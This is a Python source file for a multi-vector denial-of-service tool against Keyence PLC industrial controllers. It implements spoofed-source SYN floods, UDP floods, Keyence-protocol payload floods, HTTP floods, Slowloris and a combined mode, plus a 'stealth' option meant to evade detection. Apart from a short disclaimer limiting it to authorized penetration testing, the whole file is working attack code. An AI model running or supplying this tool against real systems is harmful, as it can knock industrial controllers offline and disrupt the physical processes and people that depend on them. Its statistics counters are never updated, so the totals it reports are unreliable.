#!/usr/bin/env python3
"""
Enhanced Keyence PLC DDoS Resilience Testing Tool
Authorized penetration testing only - Use responsibly

Features:
- Multi-vector attack simulation
- Protocol-specific targeting
- Adaptive attack patterns
- Real-time performance monitoring
- Stealth mode options
"""

import socket
import threading
import time
import argparse
import sys
import random
import struct
from concurrent.futures import ThreadPoolExecutor, as_completed
from scapy.all import IP, TCP, UDP, send, RandIP, RandShort, fragment
import scapy.all as scapy


class AdvancedKeyenceDDOSTester:
    def __init__(self, target_ip, target_port=8501, timeout=2, stealth=False):
        self.target_ip = target_ip
        self.target_port = target_port
        self.timeout = timeout
        self.stealth = stealth
        self.attack_active = False
        self.stats = {
            'packets_sent': 0,
            'connections_made': 0,
            'failed_connections': 0,
            'start_time': time.time()
        }

        # Keyence-specific payload patterns
        self.keyence_payloads = [
            # KV Protocol patterns
            b'\x50\x00\x00\xFF\xFF\x03\x00\x0C\x00\x01\x00\x01\x00\x00\x00\x00',  # Read command
            b'\x50\x01\x00\xFF\xFF\x03\x00\x0C\x00\x01\x00\x01\x00\x00\x00\x00',  # Write command
            b'\x50\x02\x00\xFF\xFF\x03\x00\x0C\x00\x01\x00\x01\x00\x00\x00\x00',  # System command
            b'\x00' * 1024,  # Null payload
            b'\xFF' * 1024,  # Max byte values
            b'\xAA' * 512,  # Alternating pattern
            random.randbytes(1024),  # Random bytes
        ]

    def print_banner(self):
        banner = r"""
  _  __          _                         ______  ______  _____ 
 | |/ /         | |                       |  ____||  ____||  __ \
 | ' / ___ _   _| | ___   __ _  ___ ______| |__   | |__   | |  | |
 |  < / _ \ | | | |/ _ \ / _` |/ _ \______|  __|  |  __|  | |  | |
 | . \  __/ |_| | | (_) | (_| |  __/      | |____ | |____ | |__| |
 |_|\_\___|\__, |_|\___/ \__, |\___|      |______||______||_____/
            __/ |         __/ |                                  
           |___/         |___/                                   
        """
        print(banner)
        print("Advanced Keyence PLC DDoS Testing Tool")
        print("=" * 50)
        print(f"Target: {self.target_ip}:{self.target_port}")
        print(f"Stealth Mode: {'Enabled' if self.stealth else 'Disabled'}")
        print("=" * 50)

    def tcp_syn_flood(self, duration=60, max_threads=500):
        """Enhanced TCP SYN Flood attack"""
        print(f"[*] Starting TCP SYN Flood for {duration} seconds")

        stop_time = time.time() + duration
        packets_sent = 0

        def syn_flood_worker():
            nonlocal packets_sent
            while self.attack_active and time.time() < stop_time:
                try:
                    # Generate random source IP and port
                    src_ip = RandIP()._fix() if not self.stealth else "192.168." + ".".join(
                        map(str, (random.randint(0, 255) for _ in range(2))))
                    src_port = RandShort()._fix()

                    # Craft SYN packet
                    ip_layer = IP(src=src_ip, dst=self.target_ip)
                    tcp_layer = TCP(sport=src_port, dport=self.target_port, flags="S",
                                    seq=random.randint(0, 4294967295))

                    # Send packet
                    send(ip_layer / tcp_layer, verbose=0)
                    packets_sent += 1

                    if packets_sent % 1000 == 0:
                        print(f"[+] Sent {packets_sent} SYN packets")

                except Exception as e:
                    if not self.stealth:
                        print(f"[-] Error in SYN flood: {e}")

        # Start multiple threads for the attack
        with ThreadPoolExecutor(max_workers=max_threads) as executor:
            futures = [executor.submit(syn_flood_worker) for _ in range(max_threads)]

            # Wait for completion or duration timeout
            for future in as_completed(futures):
                if time.time() > stop_time:
                    break

        return {'attack_type': 'TCP SYN Flood', 'packets_sent': packets_sent}

    def udp_flood(self, duration=60, max_threads=300):
        """UDP Flood attack targeting Keyence ports"""
        print(f"[*] Starting UDP Flood for {duration} seconds")

        stop_time = time.time() + duration
        packets_sent = 0

        # Keyence commonly used UDP ports
        keyence_udp_ports = [8501, 8502, 8503, 5000, 5001, 5002]

        def udp_flood_worker():
            nonlocal packets_sent
            while self.attack_active and time.time() < stop_time:
                try:
                    # Create raw socket for UDP flood
                    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    sock.settimeout(0.1)

                    # Generate random payload
                    payload_size = random.randint(100, 1500)
                    payload = random.randbytes(payload_size)

                    # Send to random Keyence UDP port
                    target_port = random.choice(keyence_udp_ports)
                    sock.sendto(payload, (self.target_ip, target_port))
                    packets_sent += 1

                    if packets_sent % 1000 == 0:
                        print(f"[+] Sent {packets_sent} UDP packets")

                    sock.close()

                except Exception as e:
                    if not self.stealth:
                        print(f"[-] Error in UDP flood: {e}")

        # Start multiple threads for the attack
        with ThreadPoolExecutor(max_workers=max_threads) as executor:
            futures = [executor.submit(udp_flood_worker) for _ in range(max_threads)]

            for future in as_completed(futures):
                if time.time() > stop_time:
                    break

        return {'attack_type': 'UDP Flood', 'packets_sent': packets_sent}

    def keyence_protocol_flood(self, duration=60, max_threads=200):
        """Keyence protocol-specific flood attack"""
        print(f"[*] Starting Keyence Protocol Flood for {duration} seconds")

        stop_time = time.time() + duration
        packets_sent = 0

        def protocol_flood_worker():
            nonlocal packets_sent
            while self.attack_active and time.time() < stop_time:
                try:
                    # Create TCP socket
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(self.timeout)

                    # Connect to target
                    sock.connect((self.target_ip, self.target_port))

                    # Send multiple Keyence protocol packets
                    for _ in range(random.randint(5, 20)):
                        payload = random.choice(self.keyence_payloads)
                        sock.send(payload)
                        packets_sent += 1

                    sock.close()

                    if packets_sent % 100 == 0:
                        print(f"[+] Sent {packets_sent} Keyence protocol packets")

                except Exception as e:
                    if not self.stealth:
                        print(f"[-] Error in protocol flood: {e}")

        # Start multiple threads for the attack
        with ThreadPoolExecutor(max_workers=max_threads) as executor:
            futures = [executor.submit(protocol_flood_worker) for _ in range(max_threads)]

            for future in as_completed(futures):
                if time.time() > stop_time:
                    break

        return {'attack_type': 'Keyence Protocol Flood', 'packets_sent': packets_sent}

    def http_flood(self, duration=60, max_threads=100):
        """HTTP Flood attack for Keyence web interfaces"""
        print(f"[*] Starting HTTP Flood for {duration} seconds")

        stop_time = time.time() + duration
        requests_sent = 0

        # Common HTTP requests for Keyence devices
        http_requests = [
            "GET / HTTP/1.1\r\nHost: {}\r\n\r\n",
            "GET /index.html HTTP/1.1\r\nHost: {}\r\n\r\n",
            "GET /main.html HTTP/1.1\r\nHost: {}\r\n\r\n",
            "POST /login.cgi HTTP/1.1\r\nHost: {}\r\nContent-Length: 0\r\n\r\n",
            "GET /status.xml HTTP/1.1\r\nHost: {}\r\n\r\n"
        ]

        def http_flood_worker():
            nonlocal requests_sent
            while self.attack_active and time.time() < stop_time:
                try:
                    # Create TCP socket
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(self.timeout)

                    # Connect to HTTP port (typically 80 or 8080)
                    sock.connect((self.target_ip, 80))

                    # Send HTTP request
                    request = random.choice(http_requests).format(self.target_ip)
                    sock.send(request.encode())
                    requests_sent += 1

                    # Try to read response to keep connection open
                    try:
                        sock.recv(1024)
                    except:
                        pass

                    sock.close()

                    if requests_sent % 50 == 0:
                        print(f"[+] Sent {requests_sent} HTTP requests")

                except Exception as e:
                    if not self.stealth:
                        print(f"[-] Error in HTTP flood: {e}")

        # Start multiple threads for the attack
        with ThreadPoolExecutor(max_workers=max_threads) as executor:
            futures = [executor.submit(http_flood_worker) for _ in range(max_threads)]

            for future in as_completed(futures):
                if time.time() > stop_time:
                    break

        return {'attack_type': 'HTTP Flood', 'requests_sent': requests_sent}

    def slowloris_attack(self, duration=120, sockets_count=150):
        """Slowloris attack to exhaust connection resources"""
        print(f"[*] Starting Slowloris attack with {sockets_count} sockets")

        sockets = []
        stop_time = time.time() + duration

        # Create multiple partial connections
        for i in range(sockets_count):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(self.timeout)
                sock.connect((self.target_ip, self.target_port))

                # Send partial HTTP request
                partial_request = f"GET / HTTP/1.1\r\nHost: {self.target_ip}\r\n".encode()
                sock.send(partial_request)

                sockets.append(sock)

                if len(sockets) % 10 == 0:
                    print(f"[+] Established {len(sockets)} partial connections")

            except Exception as e:
                if not self.stealth:
                    print(f"[-] Error creating socket: {e}")

        print(f"[*] Maintaining {len(sockets)} connections")

        # Keep connections alive with periodic data
        start_time = time.time()
        while self.attack_active and time.time() < stop_time and sockets:
            for sock in sockets[:]:
                try:
                    # Send minimal data to keep connection open
                    keep_alive = f"X-a: {random.randint(1000, 9999)}\r\n".encode()
                    sock.send(keep_alive)

                    # Random delay between 10-30 seconds
                    time.sleep(random.uniform(10, 30))

                except Exception as e:
                    sockets.remove(sock)
                    if not self.stealth:
                        print(f"[*] Connection dropped, {len(sockets)} remaining")

        # Cleanup
        for sock in sockets:
            try:
                sock.close()
            except:
                pass

        return {
            'attack_type': 'Slowloris',
            'sockets_created': sockets_count,
            'sockets_maintained': len(sockets),
            'duration': time.time() - start_time
        }

    def multi_vector_attack(self, duration=300):
        """Launch multiple attack vectors simultaneously"""
        print(f"[*] Starting Multi-Vector Attack for {duration} seconds")
        print("[!] This is a highly aggressive attack - use with caution!")

        attack_methods = [
            (self.tcp_syn_flood, {"duration": duration, "max_threads": 300}),
            (self.udp_flood, {"duration": duration, "max_threads": 200}),
            (self.keyence_protocol_flood, {"duration": duration, "max_threads": 150}),
            (self.http_flood, {"duration": duration, "max_threads": 100}),
            (self.slowloris_attack, {"duration": duration, "sockets_count": 100}),
        ]

        results = []

        # Start all attacks simultaneously
        with ThreadPoolExecutor(max_workers=len(attack_methods)) as executor:
            futures = []
            for method, kwargs in attack_methods:
                futures.append(executor.submit(method, **kwargs))

            # Wait for all attacks to complete
            for future in as_completed(futures):
                try:
                    result = future.result()
                    results.append(result)
                    print(f"[+] {result['attack_type']} completed")
                except Exception as e:
                    print(f"[-] Attack failed: {e}")

        return results

    def print_stats(self):
        """Print attack statistics"""
        duration = time.time() - self.stats['start_time']
        print("\n" + "=" * 60)
        print("ATTACK STATISTICS")
        print("=" * 60)
        print(f"Duration: {duration:.2f} seconds")
        print(f"Total packets sent: {self.stats['packets_sent']}")
        print(f"Connections made: {self.stats['connections_made']}")
        print(f"Failed connections: {self.stats['failed_connections']}")
        print(f"Packets per second: {self.stats['packets_sent'] / duration:.2f}")
        print("=" * 60)

    def run_attack(self, attack_type, duration=60, **kwargs):
        """Run a specific attack type"""
        self.attack_active = True
        self.stats['start_time'] = time.time()

        try:
            if attack_type == "syn":
                result = self.tcp_syn_flood(duration, **kwargs)
            elif attack_type == "udp":
                result = self.udp_flood(duration, **kwargs)
            elif attack_type == "keyence":
                result = self.keyence_protocol_flood(duration, **kwargs)
            elif attack_type == "http":
                result = self.http_flood(duration, **kwargs)
            elif attack_type == "slowloris":
                result = self.slowloris_attack(duration, **kwargs)
            elif attack_type == "multi":
                result = self.multi_vector_attack(duration)
            else:
                print("[-] Unknown attack type")
                return

            self.print_stats()
            return result

        except KeyboardInterrupt:
            print("\n[-] Attack interrupted by user")
        except Exception as e:
            print(f"[-] Error during attack: {e}")
        finally:
            self.attack_active = False


def main():
    parser = argparse.ArgumentParser(description="Advanced Keyence PLC DDoS Testing Tool")
    parser.add_argument("target", help="Target IP address of Keyence PLC")
    parser.add_argument("-p", "--port", type=int, default=8501, help="Target port (default: 8501)")
    parser.add_argument("-a", "--attack", choices=["syn", "udp", "keyence", "http", "slowloris", "multi"],
                        default="multi", help="Attack type (default: multi)")
    parser.add_argument("-d", "--duration", type=int, default=60, help="Attack duration in seconds (default: 60)")
    parser.add_argument("-t", "--threads", type=int, default=200, help="Max threads for attacks (default: 200)")
    parser.add_argument("-s", "--stealth", action="store_true", help="Enable stealth mode (slower, less detectable)")
    parser.add_argument("--sockets", type=int, default=100, help="Number of sockets for Slowloris (default: 100)")

    args = parser.parse_args()

    # Safety checks
    if not args.target:
        print("[-] Target IP is required")
        sys.exit(1)

    # Initialize tester
    tester = AdvancedKeyenceDDOSTester(args.target, args.port, stealth=args.stealth)
    tester.print_banner()

    print("[!] WARNING: This tool is for authorized penetration testing only!")
    print("[!] Ensure you have proper authorization before proceeding!")
    print("[!] Press Ctrl+C to abort within 5 seconds...")

    try:
        time.sleep(5)
    except KeyboardInterrupt:
        print("\n[-] Test aborted by user")
        sys.exit(0)

    # Run the attack
    kwargs = {
        "max_threads": args.threads,
        "sockets_count": args.sockets
    }

    try:
        tester.run_attack(args.attack, args.duration, **kwargs)
    except KeyboardInterrupt:
        print("\n[-] Testing interrupted by user")
    except Exception as e:
        print(f"[-] Error during testing: {e}")


if __name__ == "__main__":
    main()